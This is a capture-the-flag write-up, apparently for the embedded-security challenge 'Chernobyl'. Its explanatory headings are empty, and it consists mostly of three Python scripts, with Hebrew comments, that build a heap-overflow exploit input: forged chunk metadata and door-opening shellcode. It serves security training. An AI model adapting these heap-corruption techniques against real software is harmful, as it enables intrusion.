# Chernobyl - 300 points
 
## The idea

## The way

### Black box test:

### Explore the code:

### How to exploit:

```python
#OLD CODE
def h(string):
    index = 0
    for l in string:
        index += ord(l)
        index *= 31
    return index & 7

input1 = (b'new ' + b'\x11'*2 + b' 0;').hex() # לשנות לקוד שפותח דלת
input2 = (b'new ' + b'\x22'*2 + b' 0;').hex()
input3 = (b'new ' + b'\x33'*2 + b' 0;').hex()
input4 = (b'new ' + b'\x44'*2 + b' 0;').hex()
input5 = (b'new ' + b'\x55'*2 + b' 0;').hex()

input6 = (b'new ' + b'\x3c\x50'+b'\x5c\x51'+b'\x01' + b' 0;').hex() # מדלג כביכול לאיבר הבא וככה לא דופק את malloc.

input7 = (b'new ' + b'\x77'*2 + b' 0;').hex()
input8 = (b'new ' + b'\x88'*2 + b' 0;').hex()
input9 = (b'new ' + b'\x99'*2 + b' 0;').hex()
input10 = (b'new ' + b'\xaa'*2 + b' 0;').hex()

input11 = (b'new ' + b'\x12\x34'*3 + b'\xf2\x43'+ b'\x02\x09'+ b'\xf9\x0b' +b' 0;').hex() # אותה טכניקה כמו באלגירס
# hex(0x5042 - 0x443e - 6 - 6) = '0xbf8' ועוד אחד זה הביט של הדגל.
# זה עושה שהכתובת שנרצה תשתנה להיות המקום של הקלט הראשון ראו הערה עליו.

input1 + input2 + input3 + input4 + input5 +input6 +input7 + input8 + input9 + input10 + input11
```

```python
# CORRECT CODE
def h(string):
    index = 0
    for l in string:
        index += ord(l)
        index *= 31
    return index & 7

input1 = (b'new ' + b'\x11'*2 + b' 0;').hex() # לשנות לקוד שפותח דלת
input2 = (b'new ' + b'\x22'*2 + b' 0;').hex()
input3 = (b'new ' + b'\x33'*2 + b' 0;').hex()
input4 = (b'new ' + b'\x44'*2 + b' 0;').hex()
input5 = (b'new ' + b'\x55'*2 + b' 0;').hex()

input6 = (b'new '+b'\xf2\x43'+ b'\x3c\x53'+ b'\xff\x0b' +b'\x44' + b' 0;').hex()# גם מדלג לאיבר האחרון ולכן לא דופק את מאללוק, וגם כאשר יבדק הנקסט של הצאנק המזוייף הוא יהיה כבר תפוס מהטבלה הבאה ולכן לא יפריע לגודל שחושב כבר
#וזאת אותה טכניקה כמו באלגירס. להתייחס למקום שנרצה לשנות כגודל של צאנק

input7 = (b'new a 0;').hex()
input8 = (b'new b 0;').hex()
input9 = (b'new c 0;').hex()
input10 = (b'new d 0;').hex()
input11 = (b'new e 0;').hex()

input12 = (b'new f 0;').hex() # after rehash.

input1 + input2 + input3 + input4 + input5 +input6 +input7 + input8 + input9 + input10 + input11 + input12
```

```python
#last!
def h(string):
    index = 0
    for l in string:
        index += ord(l)
        index *= 31
    return index & 7

input1 = (b'new ' + b'\x0f\xef\x7f\x40\x7f\x11\x0f\x12\xb0\x12\xec\x4c' + b' 0;').hex() # קוד שפותח את הדלת ללא הבית 0 וללא הבית רווח. ראו תמונה
input2 = (b'new ' + b'\x22'*2 + b' 0;').hex()
input3 = (b'new ' + b'\x33'*2 + b' 0;').hex()
input4 = (b'new ' + b'\x44'*2 + b' 0;').hex()
input5 = (b'new ' + b'\x55'*2 + b' 0;').hex()

input6 = (b'new '+b'\xf2\x43'+ b'\x3c\x53'+ b'\xff\x0b' +b'\x44' + b' 0;').hex()# גם מדלג לאיבר האחרון ולכן לא דופק את מאללוק, וגם כאשר יבדק הנקסט של הצאנק המזוייף הוא יהיה כבר תפוס מהטבלה הבאה ולכן לא יפריע לגודל שחושב כבר
#וזאת אותה טכניקה כמו באלגירס. להתייחס למקום שנרצה לשנות כגודל של צאנק

input7 = (b'new a 0;').hex()
input8 = (b'new b 0;').hex()
input9 = (b'new c 0;').hex()
input10 = (b'new d 0;').hex()
input11 = (b'new e 0;').hex()

input12 = (b'new f 0;').hex() # after rehash.

input1 + input2 + input3 + input4 + input5 +input6 +input7 + input8 + input9 + input10 + input11 + input12 + '01'


```

## The cracking input (as bytes)
```

```